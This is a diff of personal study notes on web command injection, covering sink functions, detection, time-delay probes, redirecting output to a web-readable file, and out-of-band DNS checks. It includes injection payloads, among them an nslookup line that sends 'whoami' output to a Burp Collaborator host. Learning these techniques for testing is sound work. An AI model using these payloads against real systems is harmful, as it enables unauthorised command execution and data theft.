@@ -1,7 +1,7 @@
 
 ### General Notes
 
-Command injection allows attackers to execute system commands on the hosting server running a web application. It mainly arises from the idea of accepting user input into a query without being properly sanitized, allowing for an escape into the system.
+Command injection allows attackers to execute operating system commands on the hosting server running a web application. It mainly arises from the idea of accepting user input into a query without being properly sanitized, allowing for an escape into the system.
 
 > Can be used to compromise the hosting infrastructure and exploit relationships to pivot the attack.
 
@@ -11,7 +11,7 @@ Types of injections:
 * [[SQL Injections]]: User input is used in an SQL query.
 * [[Cross Site Scripting (XSS)]]: User input is displayed on the web page.
 
-> Web applications use functions to execute commands directly on the back-end server. If these commands accept user input, attackers can escape bounds and execute commands in an unrestricted manner.
+Web applications use functions to execute commands directly on the back-end server. If these commands accept user input, attackers can escape bounds and execute commands in an unrestricted manner.
 * PHP: `exec`, `system`, `shell_exec`, `passthru`,  `popen`.
 * [[NodeJs]]: `child_process.exec`.
 
@@ -39,14 +39,14 @@ Types of injections:
 #### Detection
 
 Injecting these characters in places that accept user input and observing unexpected behavior is a sign that this injection point might be vulnerable. 
+- Check whether the response is coming from the backend or the fronted. Do this using the networks tab.
 
-> Check whether the response is coming from the backend or the fronted. Do this using the networks tab.
-* If no request was sent after trying out a malicious payload, then this is front end validation, which can be easily bypassed using a proxy like [[Burp Suite]].
+> If no request was sent after trying out a malicious payload, then this is front end validation, which can be easily bypassed using a proxy like [[Burp Suite]].
 
-Another check to do is whether there is a Web Application [[Firewall]] in place. If an error is returned in a different page with information relating to our [[IP]] and request, then this request might have been denied by a WAF.
+Another check to do is whether there is a Web Application [[Firewall]] in place. 
+- If an error is returned in a different page with information relating to our [[IP]] and request, then this request might have been denied by a WAF.
 
 ---
-
 ### Injection
 
 Identifying points in the website where user input has access to backend server/database. If the application executes a shell command and returns the raw output, then we can exploit this injection point.
@@ -65,18 +65,18 @@ The `&` at the end because it separates the injected command from whatever follo
 The output of the command isn't seen in the [[HTTP]] response, therefore, other methods should be used to discover injection points.
 ##### Time Delays
 
-* Can use a time delay. The `ping` command is useful as it works for 10 seconds, therefore our command will return a response after 10 seconds.
+Can use a time delays similar to [[SQL Injections#Time Delays]]. 
+- The `ping` command is useful as we can specify the number packets, and each packet takes around 1 second.
+- Therefore, we can specify a delay and check if the response comes after that delay.
 ```
 & ping -c 10 127.0.0.1 &
 ```
 
-The output can be redirected into a file in the web application with open access from the browser.
-
+The output of an injected command can be redirected into a file in the web application with open access from the browser. We can then try and read that file, and see if the command output is written there.
 * Can write into the `static` directory: `/var/www/static/<file-name>`
 ```
 & whoami > /var/wwww/static/whoami.txt &
 ```
-
 * This `whoami.txt` file can then be seen by adding it in the URL.
 ```
 https://<URL>/whoami.txt
@@ -84,15 +84,14 @@ https://<URL>/whoami.txt
 
 ##### OAST
 
-* Blind injections can also be discovered using out of band techniques, such as performing a [[Domain Name System (DNS)]] lookup of a server we have control over, such as the [[Burp Suite]] collaborator server.
+Blind injections can also be discovered using out of band techniques, such as performing a [[Domain Name System (DNS)]] lookup of a server we have control over, such as the [[Burp Suite]] collaborator server.
 ```
 x||nslookup <burp-collab-payalod>||
 ```
-> We can get the collaborator payload by right clicking in the repeater and choosing insert collaborator payload.
- 
-Then, we can observe the `nslookup` by checking the collaborator server logs to see the results of our injection.
+- We can get the collaborator payload by right clicking in the repeater and choosing insert collaborator payload.
+ - Then, we can observe the output of the `nslookup` command by checking the collaborator server logs to see the results of our injection.
 
-* We can append the data we need to extract as a subdomain of the collaborator server.
+We can append the data we need to extract as a subdomain of the collaborator server.
 ```
 x||nslookup `whoami`.<burp-collab-payload>||
 ```
